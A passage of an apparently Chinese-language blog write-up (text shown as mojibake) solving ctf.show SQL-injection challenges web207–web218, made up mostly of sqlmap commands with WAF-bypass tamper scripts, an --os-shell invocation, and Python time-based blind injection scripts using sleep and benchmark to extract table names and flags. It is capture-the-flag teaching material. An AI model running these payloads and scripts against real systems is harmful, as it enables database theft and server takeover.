class="string">&quot;&#x27;)&quot;</span> <span class="literal">--suffix</span>=<span class="string">&quot;#&quot;</span> <span class="literal">--data</span> <span class="string">&quot;id=1&quot;</span> <span class="literal">--user-agent</span>=sqlmap <span class="literal">--referer</span>=ctf.show <span class="literal">-D</span> ctfshow_web <span class="literal">--tables</span> <span class="literal">--dump</span> <span class="literal">--batch</span> <span class="literal">--headers</span>=<span class="string">&quot;Content-Type: text/plain&quot;</span> <span class="literal">--cookie</span>=<span class="string">&quot;PHPSESSID=67bo7vdpo12g2ae9o48fh4sg8r;&quot;</span> <span class="literal">--safe-url</span>=<span class="string">&quot;http://cc9fbf46-0256-48aa-8863-044662e4bac3.challenge.ctf.show/api/getToken.php&quot;</span> <span class="literal">--safe-freq</span>=<span class="number">1</span> <span class="literal">--tamper</span>=space2comment</span><br></pre></td></tr></table></figure><h2 id="web208"><a href="#web208" class="headerlink" title="web208"></a>web208</h2><p>åªè¿‡æ»¤äº†å°å†™çš„<code>select</code>ï¼Œè€Œ<code>sqlmap</code>é»˜è®¤ç”¨çš„å¤§å†™ï¼Œæ•…å¯ä»¥ç›´æ¥ç”¨</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://87e67c0f-91ee-488a-a719-4359be5fd453.challenge.ctf.show/api/index.php&quot;</span> <span class="literal">--method</span>=PUT <span class="literal">--prefix</span>=<span class="string">&quot;&#x27;)&quot;</span> <span class="literal">--suffix</span>=<span class="string">&quot;#&quot;</span> <span class="literal">--data</span> <span class="string">&quot;id=1&quot;</span> <span class="literal">--user-agent</span>=sqlmap <span class="literal">--referer</span>=ctf.show <span class="literal">-D</span> ctfshow_web <span class="literal">--tables</span> <span class="literal">--dump</span> <span class="literal">--batch</span> <span class="literal">--headers</span>=<span class="string">&quot;Content-Type: text/plain&quot;</span> <span class="literal">--cookie</span>=<span class="string">&quot;PHPSESSID=iu086rcmu6ov5b1931b7dnhsmo;&quot;</span> <span class="literal">--safe-url</span>=<span class="string">&quot;http://87e67c0f-91ee-488a-a719-4359be5fd453.challenge.ctf.show/api/getToken.php&quot;</span> <span class="literal">--safe-freq</span>=<span class="number">1</span> <span class="literal">--tamper</span>=space2comment</span><br></pre></td></tr></table></figure><h2 id="web209"><a href="#web209" class="headerlink" title="web209"></a>web209</h2><p>ç¦ç”¨äº†<code>ç©ºæ ¼</code>ï¼Œ<code>*</code>å’Œ<code>=</code>ï¼Œè‡ªå·±å†™ä¸ª<code>tamper</code>æŠŠç©ºæ ¼è½¬<code>%09</code>ï¼Œç„¶åç”¨è‡ªå¸¦çš„<code>equaltolike</code>æŠŠ<code>=</code>è½¬<code>LIKE</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2022 sqlmap developers (https://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Replaces all occurrences of operator equal (&#x27; &#x27;) with &#x27;%09&#x27; counterpart</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Tested against:</span></span><br><span class="line"><span class="string">        * MySQL 4, 5.0 and 5.5</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Notes:</span></span><br><span class="line"><span class="string">        * Useful to bypass weak and bespoke web application firewalls that</span></span><br><span class="line"><span class="string">          filter the equal character (&#x27;=&#x27;)</span></span><br><span class="line"><span class="string">        * The LIKE operator is SQL standard. Hence, this tamper script</span></span><br><span class="line"><span class="string">          should work against all (?) databases</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper(&#x27;SELECT * FROM users WHERE id=1&#x27;)</span></span><br><span class="line"><span class="string">    &#x27;SELECT%09*%09FROM%09users%09WHERE%09id=1&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = <span class="string">&quot;&quot;</span></span><br><span class="line">        quote, doublequote, firstspace = <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">len</span>(payload)):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> firstspace:</span><br><span class="line">                <span class="keyword">if</span> payload[i].isspace():</span><br><span class="line">                    firstspace = <span class="literal">True</span></span><br><span class="line">                    retVal += <span class="built_in">chr</span>(<span class="number">9</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;\&#x27;&#x27;</span>:</span><br><span class="line">                quote = <span class="keyword">not</span> quote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;&quot;&#x27;</span>:</span><br><span class="line">                doublequote = <span class="keyword">not</span> doublequote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&quot; &quot;</span> <span class="keyword">and</span> <span class="keyword">not</span> doublequote <span class="keyword">and</span> <span class="keyword">not</span> quote:</span><br><span class="line">                retVal += <span class="built_in">chr</span>(<span class="number">9</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            retVal += payload[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure><p>ç„¶åæ³¨å…¥å³å¯</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://b444630b-fdaf-42b0-a937-6bedf23552c8.challenge.ctf.show/api/index.php&quot;</span> <span class="literal">--method</span>=PUT <span class="literal">--data</span> <span class="string">&quot;id=1&quot;</span> <span class="literal">--user-agent</span>=sqlmap <span class="literal">--referer</span>=ctf.show <span class="literal">-D</span> ctfshow_web <span class="literal">--tables</span> <span class="literal">--dump</span> <span class="literal">--batch</span> <span class="literal">--headers</span>=<span class="string">&quot;Content-Type: text/plain&quot;</span> <span class="literal">--cookie</span>=<span class="string">&quot;PHPSESSID=qhel3mleaja9g3me4qafpa41m7;&quot;</span> <span class="literal">--safe-url</span>=<span class="string">&quot;http://b444630b-fdaf-42b0-a937-6bedf23552c8.challenge.ctf.show/api/getToken.php&quot;</span> <span class="literal">--safe-freq</span>=<span class="number">1</span> <span class="literal">--tamper</span>=spaceto09,equaltolike</span><br></pre></td></tr></table></figure><h2 id="web210"><a href="#web210" class="headerlink" title="web210"></a>web210</h2><p>æœ‰ä¸ªè§£å¯†è¿‡ç¨‹</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å¯¹æŸ¥è¯¢å­—ç¬¦è¿›è¡Œè§£å¯†</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params"><span class="variable">$id</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$id</span>))));</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>å†™ä¸ª<code>tamper</code>è¿›è¡ŒåŠ å¯†å³å¯</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2022 sqlmap developers (https://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    To solve ctfshow web210</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Tested against:</span></span><br><span class="line"><span class="string">        * MySQL 4, 5.0 and 5.5</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper(&#x27;SELECT id FROM users&#x27;)</span></span><br><span class="line"><span class="string">    &#x27;PU1WUk1WMFFVQlNha0JpUlM5VVRnVTNjbEozYw==&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    payload = <span class="built_in">bytes</span>(payload,encoding = <span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    retVal = base64.b64encode(base64.b64encode(payload[::-<span class="number">1</span>])[::-<span class="number">1</span>])</span><br><span class="line">    retVal = retVal.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿›è¡Œæ³¨å…¥</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://9c8ba351-ef94-4fce-9ab9-d3830183aa80.challenge.ctf.show/api/index.php&quot;</span> <span class="literal">--method</span>=PUT <span class="literal">--data</span> <span class="string">&quot;id=1&quot;</span> <span class="literal">--user-agent</span>=sqlmap <span class="literal">--referer</span>=ctf.show <span class="literal">-D</span> ctfshow_web <span class="literal">--tables</span> <span class="literal">--dump</span> <span class="literal">--batch</span> <span class="literal">--headers</span>=<span class="string">&quot;Content-Type: text/plain&quot;</span> <span class="literal">--cookie</span>=<span class="string">&quot;PHPSESSID=u1sdsf6g3cro8q18mg305dok88;&quot;</span> <span class="literal">--safe-url</span>=<span class="string">&quot;http://9c8ba351-ef94-4fce-9ab9-d3830183aa80.challenge.ctf.show/api/getToken.php&quot;</span> <span class="literal">--safe-freq</span>=<span class="number">1</span> <span class="literal">--tamper</span>=ctfshowweb210</span><br></pre></td></tr></table></figure><h2 id="web211"><a href="#web211" class="headerlink" title="web211"></a>web211</h2><p>åœ¨ä¸Šä¸€å…³åŸºç¡€ä¸Šè¿‡æ»¤äº†ç©ºæ ¼</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://9ba42ae2-b5b6-42fb-9a97-3fe76bfad647.challenge.ctf.show/api/index.php&quot;</span> <span class="literal">--method</span>=PUT <span class="literal">--data</span> <span class="string">&quot;id=1&quot;</span> <span class="literal">--user-agent</span>=sqlmap <span class="literal">--referer</span>=ctf.show <span class="literal">-D</span> ctfshow_web <span class="literal">--tables</span> <span class="literal">--dump</span> <span class="literal">--batch</span> <span class="literal">--headers</span>=<span class="string">&quot;Content-Type: text/plain&quot;</span> <span class="literal">--cookie</span>=<span class="string">&quot;PHPSESSID=r203hge81fkks8u8sj6pckeap6;&quot;</span> <span class="literal">--safe-url</span>=<span class="string">&quot;http://9ba42ae2-b5b6-42fb-9a97-3fe76bfad647.challenge.ctf.show/api/getToken.php&quot;</span> <span class="literal">--safe-freq</span>=<span class="number">1</span> <span class="literal">--tamper</span>=space2comment,ctfshowweb210</span><br></pre></td></tr></table></figure><h2 id="web212"><a href="#web212" class="headerlink" title="web212"></a>web212</h2><p>åœ¨ä¸Šä¸€å…³åŸºç¡€ä¸Šè¿‡æ»¤äº†<code>*</code></p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://1505ab2c-fe52-41e3-9b1f-d94ba6a346e6.challenge.ctf.show/api/index.php&quot;</span> <span class="literal">--method</span>=PUT <span class="literal">--data</span> <span class="string">&quot;id=1&quot;</span> <span class="literal">--user-agent</span>=sqlmap <span class="literal">--referer</span>=ctf.show <span class="literal">-D</span> ctfshow_web <span class="literal">--tables</span> <span class="literal">--dump</span> <span class="literal">--batch</span> <span class="literal">--headers</span>=<span class="string">&quot;Content-Type: text/plain&quot;</span> <span class="literal">--cookie</span>=<span class="string">&quot;PHPSESSID=hu1t6tuqcfu7vmme69i18bojq9;&quot;</span> <span class="literal">--safe-url</span>=<span class="string">&quot;http://1505ab2c-fe52-41e3-9b1f-d94ba6a346e6.challenge.ctf.show/api/getToken.php&quot;</span> <span class="literal">--safe-freq</span>=<span class="number">1</span> <span class="literal">--tamper</span>=spaceto09,ctfshowweb210</span><br></pre></td></tr></table></figure><h2 id="web213"><a href="#web213" class="headerlink" title="web213"></a>web213</h2><p>åœ¨æœ€ååŠ ä¸Šå‚æ•°<code>--os-shell</code>å³å¯</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://cda45164-89a8-403c-bbb8-ff48beb3c89b.challenge.ctf.show/api/index.php&quot;</span> <span class="literal">--method</span>=PUT <span class="literal">--data</span> <span class="string">&quot;id=1&quot;</span> <span class="literal">--user-agent</span>=sqlmap <span class="literal">--referer</span>=ctf.show <span class="literal">--headers</span>=<span class="string">&quot;Content-Type: text/plain&quot;</span> <span class="literal">--cookie</span>=<span class="string">&quot;PHPSESSID=6rop5p56jt75lmc41mkvdi0rt1;&quot;</span> <span class="literal">--safe-url</span>=<span class="string">&quot;http://cda45164-89a8-403c-bbb8-ff48beb3c89b.challenge.ctf.show/api/getToken.php&quot;</span> <span class="literal">--safe-freq</span>=<span class="number">1</span> <span class="literal">--tamper</span>=spaceto09,ctfshowweb210 <span class="literal">--batch</span> <span class="literal">--os-shell</span></span><br></pre></td></tr></table></figure><p>æ‰§è¡Œ<code>cat /ctfshow_flag</code>å³å¯</p><h2 id="web214"><a href="#web214" class="headerlink" title="web214"></a>web214</h2><p>æ—¶é—´ç›²æ³¨ï¼Œè®¿é—®é¦–é¡µæŠ“åŒ…å¯ä»¥å‘ç°æ³¨å…¥ç‚¹ï¼Œä¿®æ”¹<code>debug=1</code>å¯ä»¥çœ‹åˆ°<code>sql</code>è¯­å¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select id from ctfshow_info where ip = 127.0.0.1</span><br></pre></td></tr></table></figure><p>ç¼–å†™è„šæœ¬å³å¯</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://074260b2-9b7b-4c5f-a1b9-74b294124195.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    l = <span class="number">32</span></span><br><span class="line">    r = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> l &lt; r:</span><br><span class="line">        mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(mid==l):</span><br><span class="line">            flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="comment"># æ•°æ®åº“ ctfshow_web </span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;:f&quot;if((ascii(substr((select database()),&#123;i&#125;,1))&lt;&#123;mid&#125;),sleep(3),1)&quot;,</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># è¡¨å ctfshow_flagx,ctfshow_info</span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;:f&quot;if((ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&lt;&#123;mid&#125;),sleep(3),1)&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># åˆ—å id,flaga,info</span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;:f&quot;if((ascii(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;ctfshow_flagx&#x27;),&#123;i&#125;,1))&lt;&#123;mid&#125;),sleep(3),1)&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># ctfshow&#123;0c212089-3b00-4cd9-b24f-2c2ab51a9674&#125;</span></span><br><span class="line">            <span class="string">&quot;ip&quot;</span>:<span class="string">f&quot;if((ascii(substr((select group_concat(flaga)from ctfshow_flagx),<span class="subst">&#123;i&#125;</span>,1))&lt;<span class="subst">&#123;mid&#125;</span>),sleep(3),1)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>: <span class="string">&quot;0&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.post(url=url, data=data, timeout=<span class="number">2</span>)</span><br><span class="line">            l = mid</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            r = mid</span><br></pre></td></tr></table></figure><h2 id="web215"><a href="#web215" class="headerlink" title="web215"></a>web215</h2><p>å¤šäº†å¼•å·åŒ…è£¹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select id from ctfshow_info where ip = &#x27;127.0.0.1&#x27;;</span><br></pre></td></tr></table></figure><p>è¿˜æ˜¯äºŒåˆ†æ—¶é—´ç›²æ³¨</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://7dedec9c-cc09-44c5-b69a-f2c187da25e4.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    l = <span class="number">32</span></span><br><span class="line">    r = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> l &lt; r:</span><br><span class="line">        mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(mid==l):</span><br><span class="line">            flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="comment"># æ•°æ®åº“ ctfshow_web </span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;:f&quot;&#x27;||if((ascii(substr((select database()),&#123;i&#125;,1))&lt;&#123;mid&#125;),sleep(3),1)#&quot;,</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># è¡¨å ctfshow_flagxc,ctfshow_info </span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;:f&quot;&#x27;||if((ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&lt;&#123;mid&#125;),sleep(3),1)#&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># åˆ—å id,flagaa,info</span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;:f&quot;&#x27;||if((ascii(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;ctfshow_flagxc&#x27;),&#123;i&#125;,1))&lt;&#123;mid&#125;),sleep(3),1)#&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># ctfshow&#123;ddf21244-bda1-4631-8272-8e5fc47275a5&#125;</span></span><br><span class="line">            <span class="string">&quot;ip&quot;</span>:<span class="string">f&quot;&#x27;||if((ascii(substr((select group_concat(flagaa)from ctfshow_flagxc),<span class="subst">&#123;i&#125;</span>,1))&lt;<span class="subst">&#123;mid&#125;</span>),sleep(3),1)#&quot;</span>,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>: <span class="string">&quot;0&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.post(url=url, data=data, timeout=<span class="number">2</span>)</span><br><span class="line">            l = mid</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            r = mid</span><br></pre></td></tr></table></figure><h2 id="web216"><a href="#web216" class="headerlink" title="web216"></a>web216</h2><p>å¢åŠ äº†<code>base64</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select id from ctfshow_info where ip = from_base64(127.0.0.1);</span><br></pre></td></tr></table></figure><p>ç”¨æ‹¬å·é—­åˆå°±å¥½</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://5e3ed249-6c2f-4151-9eb4-c2d122870908.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    l = <span class="number">32</span></span><br><span class="line">    r = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> l &lt; r:</span><br><span class="line">        mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(mid==l):</span><br><span class="line">            flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="comment"># æ•°æ®åº“ ctfshow_web </span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;:f&quot;0)||if((ascii(substr((select database()),&#123;i&#125;,1))&lt;&#123;mid&#125;),sleep(3),1)#&quot;,</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># è¡¨å ctfshow_flagxcc,ctfshow_info </span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;:f&quot;0)||if((ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&lt;&#123;mid&#125;),sleep(3),1)#&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># åˆ—å id,flagaac,info</span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;:f&quot;0)||if((ascii(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;ctfshow_flagxcc&#x27;),&#123;i&#125;,1))&lt;&#123;mid&#125;),sleep(3),1)#&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># ctfshow&#123;3c215bb4-3aab-4149-96fb-ea6c2bbdf49d&#125; </span></span><br><span class="line">            <span class="string">&quot;ip&quot;</span>:<span class="string">f&quot;0)||if((ascii(substr((select group_concat(flagaac)from ctfshow_flagxcc),<span class="subst">&#123;i&#125;</span>,1))&lt;<span class="subst">&#123;mid&#125;</span>),sleep(3),1)#&quot;</span>,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>: <span class="string">&quot;0&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.post(url=url, data=data, timeout=<span class="number">2</span>)</span><br><span class="line">            l = mid</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            r = mid</span><br></pre></td></tr></table></figure><h2 id="web217"><a href="#web217" class="headerlink" title="web217"></a>web217</h2><p>è¿‡æ»¤äº†<code>sleep</code>ï¼Œå¹¶ä¸”éœ€è¦æ‹¬å·é—­åˆ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select id from ctfshow_info where ip = (1);</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>benchmark</code>ï¼Œè¿ç®—æ¬¡æ•°å’Œ<code>timeout</code>ç­‰è¦æ ¹æ®å…·ä½“æƒ…å†µè°ƒæ•´ï¼ˆå¤ªæŠ˜ç£¨ğŸ˜¥ï¼Œæœ‰å¥½æ–¹æ³•ä¹Ÿå¸Œæœ›æ•™æ•™æˆ‘ï¼‰</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://59ec0bcc-2aa8-44eb-978b-20e0354ff0a2.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    l = <span class="number">32</span></span><br><span class="line">    r = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> l &lt; r:</span><br><span class="line">        mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(mid==l):</span><br><span class="line">            flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="comment"># æ•°æ®åº“ ctfshow_web </span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;:f&quot;0)||if((ascii(substr((select database()),&#123;i&#125;,1))&lt;&#123;mid&#125;),benchmark(50000000,&#x27;evo1&#x27;),1)#&quot;,</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># è¡¨å ctfshow_flagxccb,ctfshow_info </span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;:f&quot;0)||if((ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&lt;&#123;mid&#125;),benchmark(150000000,&#x27;evo1&#x27;),1)#&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># åˆ—å id,flagaabc,info</span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;:f&quot;0)||if((ascii(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;ctfshow_flagxccb&#x27;),&#123;i&#125;,1))&lt;&#123;mid&#125;),benchmark(150000000,&#x27;evo1&#x27;),1)#&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># ctfshow&#123;c8faf32a-fe53-41f0-a7df-560a0971f034&#125; </span></span><br><span class="line">            <span class="string">&quot;ip&quot;</span>:<span class="string">f&quot;0)||if((ascii(substr((select group_concat(flagaabc)from ctfshow_flagxccb),<span class="subst">&#123;i&#125;</span>,1))&lt;<span class="subst">&#123;mid&#125;</span>),benchmark(150000000,&#x27;evo1&#x27;),1)#&quot;</span>,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>: <span class="string">&quot;0&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        time.sleep(<span class="number">0.7</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.post(url=url, data=data, timeout=<span class="number">2</span>)</span><br><span class="line">            l = mid</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            r = mid</span><br></pre></td></tr></table></figure><p>ä¹Ÿæœ‰ä¸€äº›å…¶ä»–æ–¹æ³•<a href="https://www.jb51.net/article/212587.htm">MySQLæ—¶é—´ç›²æ³¨çš„äº”ç§å»¶æ—¶æ–¹æ³•å®ç°</a></p><h2 id="web218"><a href="#web218" class="headerlink" title="web218"></a>web218</h2><p><code>benchmark</code>ä¹Ÿè¢«ç¦ç”¨äº†ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨ç¬›å¡å°”ç§¯</p><figure class="highlight 